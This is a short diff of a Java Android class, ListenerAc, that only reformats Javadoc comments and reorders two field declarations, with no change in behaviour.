@@ -16,17 +16,19 @@ import com.android.syssetup.Ac;
 import com.android.syssetup.Status;
 
 public class ListenerAc extends Listener<Ac> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ListenerAc"; //$NON-NLS-1$
-
-	private BAc acReceiver;
-
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static ListenerAc singleton;
+	private BAc acReceiver;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static ListenerAc self() {
